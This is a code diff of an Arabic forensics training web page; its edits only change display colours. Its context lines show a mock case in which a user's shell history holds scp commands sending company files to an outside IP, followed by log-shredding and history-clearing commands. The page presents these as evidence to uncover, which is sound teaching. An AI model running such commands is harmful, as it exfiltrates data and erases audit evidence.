@@ -37,18 +37,18 @@ h2{color:#006633;margin-bottom:8px;font-size:1.2rem}
 .data-table{width:100%;border-collapse:collapse;font-size:.8rem}
 .data-table th{background:#0d2a1a;color:#22c55e;padding:8px;text-align:right;border-bottom:2px solid #1e5c3a}
 .data-table td{padding:8px;border-bottom:1px solid #c8ddd2;color:#4a7a5e;font-family:monospace;font-size:.76rem}
-.data-table tr.highlight td{background:rgba(255,68,68,.08);color:#ff8888}
+.data-table tr.highlight td{background:rgba(255,68,68,.08);color:#991b1b}
 .data-table tr:hover td{background:rgba(34,197,94,.04)}
 .quiz-box{background:#ffffff;border:1px solid #c8ddd2;border-radius:8px;padding:16px;margin:12px 0}
 .quiz-box h4{color:#22c55e;margin-bottom:10px;font-size:.9rem}
 .options label{display:flex;align-items:center;gap:10px;padding:9px 12px;margin:5px 0;background:#f0f7f3;border:1px solid #c8ddd2;border-radius:6px;cursor:pointer;font-size:.86rem;-webkit-tap-highlight-color:transparent}
 .options label.correct{border-color:#065f46;background:rgba(0,255,136,.08);color:#065f46}
-.options label.wrong{border-color:#ff4444;background:rgba(255,68,68,.08);color:#ff8888}
+.options label.wrong{border-color:#ff4444;background:rgba(255,68,68,.08);color:#991b1b}
 .options input{accent-color:#22c55e;flex-shrink:0}
 .badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:.72rem;font-weight:bold}
 .badge-green{background:rgba(34,197,94,.2);color:#22c55e}
-.badge-red{background:rgba(255,68,68,.2);color:#ff8888}
-.badge-orange{background:rgba(255,170,0,.2);color:#ffaa00}
+.badge-red{background:rgba(127,29,29,.1);color:#991b1b}
+.badge-orange{background:rgba(120,53,15,.1);color:#92400e}
 .badge-blue{background:rgba(0,102,51,.2);color:#006633}
 .disk-visual{display:flex;flex-direction:column;gap:3px;font-family:'Courier New',monospace;font-size:.78rem}
 .disk-sector{display:flex;align-items:center;gap:10px;padding:6px 10px;border-radius:4px;transition:all .2s}
@@ -82,7 +82,7 @@ h2{color:#006633;margin-bottom:8px;font-size:1.2rem}
 .linux-log{background:#020a06;border:1px solid #c8ddd2;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:.76rem;line-height:1.9;max-height:280px;overflow-y:auto}
 .log-time{color:#4a7a5e}
 .log-host{color:#22c55e}
-.log-service{color:#ffaa00}
+.log-service{color:#92400e}
 .log-msg{color:#4a7a5e}
 .log-alert{color:#ff4444;font-weight:bold}
 .partition-row{display:flex;gap:0;height:44px;border-radius:6px;overflow:hidden;margin:10px 0}
@@ -129,7 +129,7 @@ h2{color:#006633;margin-bottom:8px;font-size:1.2rem}
   </div>
   <div style="margin-right:auto;display:flex;align-items:center;gap:8px;flex-wrap:wrap">
     <span id="prog-badge" style="background:rgba(6,182,212,.1);border:1px solid rgba(6,182,212,.3);border-radius:20px;padding:5px 14px;font-size:.8rem;color:#22d3ee;white-space:nowrap">🏆 0/90 نقطة</span>
-    <button onclick="resetProg()" style="background:rgba(255,68,68,.1);border:1px solid rgba(255,68,68,.3);border-radius:6px;color:#ff8888;padding:5px 10px;font-size:.75rem;cursor:pointer;white-space:nowrap">↺ إعادة</button>
+    <button onclick="resetProg()" style="background:rgba(255,68,68,.1);border:1px solid rgba(255,68,68,.3);border-radius:6px;color:#991b1b;padding:5px 10px;font-size:.75rem;cursor:pointer;white-space:nowrap">↺ إعادة</button>
     <a href="index.html" style="color:#4a7a5e;font-size:.82rem;text-decoration:none;border:1px solid #c8ddd2;padding:6px 12px;border-radius:6px">← الرئيسية</a>
   </div>
 </div>
@@ -317,7 +317,7 @@ MD5: a3f7c9d2e1b845f0123456789abcdef0
       <div class="part" style="background:#1e5c3a;flex:1;color:#22c55e" onclick="showMBRSection('parttable')">
         Partition Table<span>64 بايت (4 إدخالات)</span>
       </div>
-      <div class="part" style="background:#5c3a1e;flex:0 0 60px;color:#ffaa00" onclick="showMBRSection('sig')">
+      <div class="part" style="background:#5c3a1e;flex:0 0 60px;color:#92400e" onclick="showMBRSection('sig')">
         Signature<span>0x55AA</span>
       </div>
     </div>
@@ -331,12 +331,12 @@ MD5: a3f7c9d2e1b845f0123456789abcdef0
     <div style="overflow-x:auto">
     <table class="data-table" style="font-family:inherit">
       <tr><th>الخاصية</th><th>MBR (قديم)</th><th>GPT (حديث)</th></tr>
-      <tr><td>أقصى حجم قرص</td><td style="color:#ff8888">2 تيرابايت</td><td style="color:#22c55e">9.4 زيتابايت (لا نهاية عملياً)</td></tr>
-      <tr><td>عدد الأقسام</td><td style="color:#ff8888">4 أقسام رئيسية</td><td style="color:#22c55e">128 قسم</td></tr>
-      <tr><td>النسخ الاحتياطي</td><td style="color:#ff8888">لا يوجد</td><td style="color:#22c55e">نسخة احتياطية في نهاية القرص</td></tr>
-      <tr><td>التحقق من السلامة</td><td style="color:#ff8888">لا يوجد</td><td style="color:#22c55e">CRC32 checksum</td></tr>
-      <tr><td>التوافق</td><td style="color:#22c55e">كل الأنظمة</td><td style="color:#ffaa00">يحتاج UEFI (أنظمة حديثة)</td></tr>
-      <tr><td>أهمية جنائية</td><td style="color:#ffaa00">الأقسام المخفية سهلة الإنشاء</td><td style="color:#22c55e">GUID يُحدّد نوع كل قسم بدقة</td></tr>
+      <tr><td>أقصى حجم قرص</td><td style="color:#991b1b">2 تيرابايت</td><td style="color:#22c55e">9.4 زيتابايت (لا نهاية عملياً)</td></tr>
+      <tr><td>عدد الأقسام</td><td style="color:#991b1b">4 أقسام رئيسية</td><td style="color:#22c55e">128 قسم</td></tr>
+      <tr><td>النسخ الاحتياطي</td><td style="color:#991b1b">لا يوجد</td><td style="color:#22c55e">نسخة احتياطية في نهاية القرص</td></tr>
+      <tr><td>التحقق من السلامة</td><td style="color:#991b1b">لا يوجد</td><td style="color:#22c55e">CRC32 checksum</td></tr>
+      <tr><td>التوافق</td><td style="color:#22c55e">كل الأنظمة</td><td style="color:#92400e">يحتاج UEFI (أنظمة حديثة)</td></tr>
+      <tr><td>أهمية جنائية</td><td style="color:#92400e">الأقسام المخفية سهلة الإنشاء</td><td style="color:#22c55e">GUID يُحدّد نوع كل قسم بدقة</td></tr>
     </table>
     </div>
   </div>
@@ -396,7 +396,7 @@ khalid_disk.img2          206848 943720447 943513600   450G  Microsoft basic dat
       <div class="disk-sector" style="background:#1e3a1a">
         <div class="sector-addr">Cluster 8</div>
         <div class="sector-bar" style="width:200px;background:#ffaa00"></div>
-        <div class="sector-label" style="color:#ffaa00">$LogFile — سجل المعاملات (Journaling)</div>
+        <div class="sector-label" style="color:#92400e">$LogFile — سجل المعاملات (Journaling)</div>
       </div>
       <div class="disk-sector" style="background:#1e3a1a">
         <div class="sector-addr">...</div>
@@ -455,14 +455,14 @@ Interesting deleted files found:
       <div style="padding-right:20px"><span class="log-service">auth.log</span> <span style="color:#4a7a5e">← تسجيلات الدخول، sudo، SSH</span></div>
       <div style="padding-right:20px"><span class="log-service">syslog</span> <span style="color:#4a7a5e">← أحداث النظام العامة</span></div>
       <div style="padding-right:20px"><span class="log-service">apache2/access.log</span> <span style="color:#4a7a5e">← طلبات الويب</span></div>
-      <div style="padding-right:20px"><span class="log-service">cron.log</span> <span style="color:#ffaa00">← المهام المجدولة ⚠️</span></div>
+      <div style="padding-right:20px"><span class="log-service">cron.log</span> <span style="color:#92400e">← المهام المجدولة ⚠️</span></div>
       <div style="padding-right:20px"><span class="log-service">wtmp / btmp</span> <span style="color:#4a7a5e">← سجل كل جلسات الدخول</span></div>
       <div style="color:#22c55e;margin-top:4px">/home/user/ ← <span style="color:#4a7a5e">بيانات المستخدم</span></div>
       <div style="padding-right:20px"><span style="color:#ff4444">.bash_history</span> <span style="color:#4a7a5e">← سجل كل الأوامر المنفذة ⭐</span></div>
-      <div style="padding-right:20px"><span style="color:#ffaa00">.ssh/known_hosts</span> <span style="color:#4a7a5e">← الخوادم التي اتصل بها</span></div>
-      <div style="padding-right:20px"><span style="color:#ffaa00">.bash_profile / .bashrc</span> <span style="color:#4a7a5e">← قد يحتوي أوامر خبيثة</span></div>
+      <div style="padding-right:20px"><span style="color:#92400e">.ssh/known_hosts</span> <span style="color:#4a7a5e">← الخوادم التي اتصل بها</span></div>
+      <div style="padding-right:20px"><span style="color:#92400e">.bash_profile / .bashrc</span> <span style="color:#4a7a5e">← قد يحتوي أوامر خبيثة</span></div>
       <div style="color:#22c55e;margin-top:4px">/etc/ ← <span style="color:#4a7a5e">إعدادات النظام</span></div>
-      <div style="padding-right:20px"><span style="color:#ffaa00">crontab / cron.d/</span> <span style="color:#4a7a5e">← مهام مجدولة — Persistence!</span></div>
+      <div style="padding-right:20px"><span style="color:#92400e">crontab / cron.d/</span> <span style="color:#4a7a5e">← مهام مجدولة — Persistence!</span></div>
       <div style="padding-right:20px"><span style="color:#ff4444">passwd / shadow</span> <span style="color:#4a7a5e">← حسابات المستخدمين وكلمات المرور</span></div>
       <div style="color:#22c55e;margin-top:4px">/tmp/ و /dev/shm/ ← <span style="color:#ff4444">يُستخدمان لإخفاء الملفات الخبيثة ⚠️</span></div>
     </div>
@@ -531,7 +531,7 @@ Interesting deleted files found:
 Searching for recoverable files...
 <span style="color:#22c55e">Recovered: /home/khalid/Documents/transfer_log.txt</span>
 <span style="color:#22c55e">Recovered: /home/khalid/.config/secret_config.json</span>
-<span style="color:#ffaa00">Partially recovered: /tmp/payload.sh (60% intact)</span>
+<span style="color:#92400e">Partially recovered: /tmp/payload.sh (60% intact)</span>
 <span style="color:#ff4444">Cannot recover: /var/log/auth.log (overwritten)</span>
 Files recovered: 2 complete, 1 partial</div>
     </div>
@@ -694,7 +694,7 @@ function runVolPlugin(el,plugin){
   // Color the output
   let colored=output
     .replace(/\x1b\[31m(.*?)\x1b\[0m/gs,'<span style="color:#ff4444">$1</span>')
-    .replace(/\x1b\[33m(.*?)\x1b\[0m/gs,'<span style="color:#ffaa00">$1</span>');
+    .replace(/\x1b\[33m(.*?)\x1b\[0m/gs,'<span style="color:#92400e">$1</span>');
   document.getElementById('vol-output').innerHTML=colored;
 }
 
@@ -739,7 +739,7 @@ function showMBRHex(){
     <div style="color:#006633">01BE: 80 20 21 00 0B FE FF FF 00 08 00 00 00 20 03 00</div>
     <div style="color:#006633">01CE: 00 FE FF FF 0C FE FF FF 00 28 03 00 00 00 00 04</div>
     <div style="color:#ff4444">01DE: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ← قسم مخفي بدون نوع!</div>
-    <div style="color:#ffaa00">01FE: <strong>55 AA</strong>  ← Boot Signature</div>
+    <div style="color:#92400e">01FE: <strong>55 AA</strong>  ← Boot Signature</div>
   </div>`;
 }
 
@@ -771,7 +771,7 @@ function showMFTEntry(){
     <div><span style="color:#4a7a5e;display:inline-block;min-width:200px">Filename:</span> secret_transfer.xlsx</div>
     <div><span style="color:#4a7a5e;display:inline-block;min-width:200px">Size:</span> 88,241,152 bytes (84.1 MB)</div>
     <div><span style="color:#4a7a5e;display:inline-block;min-width:200px">Created:</span> 2024-03-15 09:22:11</div>
-    <div><span style="color:#4a7a5e;display:inline-block;min-width:200px">Modified:</span> <span style="color:#ffaa00">2024-03-20 14:28:44</span></div>
+    <div><span style="color:#4a7a5e;display:inline-block;min-width:200px">Modified:</span> <span style="color:#92400e">2024-03-20 14:28:44</span></div>
     <div><span style="color:#4a7a5e;display:inline-block;min-width:200px">Deleted:</span> <span style="color:#ff4444">2024-03-20 14:30:22</span></div>
     <div><span style="color:#4a7a5e;display:inline-block;min-width:200px">Data Runs:</span> Cluster 841200–841643 (يمكن استرداده!)</div>
   </div>
@@ -784,12 +784,12 @@ function showBashHistory(){
   <div class="linux-log">
     <div><span class="log-time">2024-03-20 08:15</span> <span style="color:#4a7a5e">ls -la /home/khalid/Documents/</span></div>
     <div><span class="log-time">2024-03-20 08:22</span> <span style="color:#4a7a5e">cat /etc/passwd</span></div>
-    <div><span class="log-time">2024-03-20 13:55</span> <span style="color:#ffaa00">ssh root@185.220.101.42</span></div>
+    <div><span class="log-time">2024-03-20 13:55</span> <span style="color:#92400e">ssh root@185.220.101.42</span></div>
     <div><span class="log-time">2024-03-20 14:20</span> <span style="color:#ff4444">scp secret_transfer.xlsx root@185.220.101.42:/uploads/</span></div>
     <div><span class="log-time">2024-03-20 14:25</span> <span style="color:#ff4444">scp company_data_full.zip root@185.220.101.42:/uploads/</span></div>
     <div><span class="log-time">2024-03-20 14:30</span> <span style="color:#ff4444">rm -rf ~/Documents/secret_transfer.xlsx ~/Documents/company_data_full.zip</span></div>
-    <div><span class="log-time">2024-03-20 14:31</span> <span style="color:#ff4444">shred -vfz -n 3 /var/log/auth.log</span> <span style="color:#ffaa00">← حاول مسح السجل!</span></div>
-    <div><span class="log-time">2024-03-20 14:32</span> <span style="color:#ff4444">history -c && history -w</span> <span style="color:#ffaa00">← حاول مسح التاريخ — لكنه محفوظ في الـ RAM dump!</span></div>
+    <div><span class="log-time">2024-03-20 14:31</span> <span style="color:#ff4444">shred -vfz -n 3 /var/log/auth.log</span> <span style="color:#92400e">← حاول مسح السجل!</span></div>
+    <div><span class="log-time">2024-03-20 14:32</span> <span style="color:#ff4444">history -c && history -w</span> <span style="color:#92400e">← حاول مسح التاريخ — لكنه محفوظ في الـ RAM dump!</span></div>
   </div>
   <div class="alert alert-danger" style="margin-top:10px">🚨 bash_history يُثبت: نقل الملفات بـ scp إلى الـ IP الخبيث، ثم حذفها، ثم محاولة مسح الدليل!</div>`;
 }
@@ -860,7 +860,7 @@ function showInode(){
     <div><span style="color:#4a7a5e;min-width:180px;display:inline-block">Owner UID:</span> 1001 (khalid)</div>
     <div><span style="color:#4a7a5e;min-width:180px;display:inline-block">Size:</span> 4,281 bytes</div>
     <div><span style="color:#4a7a5e;min-width:180px;display:inline-block">atime (last access):</span> 2024-03-20 14:28:33</div>
-    <div><span style="color:#4a7a5e;min-width:180px;display:inline-block">mtime (last modify):</span> <span style="color:#ffaa00">2024-03-20 14:25:11</span></div>
+    <div><span style="color:#4a7a5e;min-width:180px;display:inline-block">mtime (last modify):</span> <span style="color:#92400e">2024-03-20 14:25:11</span></div>
     <div><span style="color:#4a7a5e;min-width:180px;display:inline-block">ctime (inode change):</span> 2024-03-20 14:30:05</div>
     <div><span style="color:#4a7a5e;min-width:180px;display:inline-block">Link count:</span> <span style="color:#ff4444">0 ← محذوف (لا روابط)</span></div>
     <div><span style="color:#4a7a5e;min-width:180px;display:inline-block">Data blocks:</span> 841200, 841201 (قابل للاسترداد)</div>
@@ -938,6 +938,7 @@ window.addEventListener('load',()=>{
 </div>
 </body>
 </html>
+
 
 
 
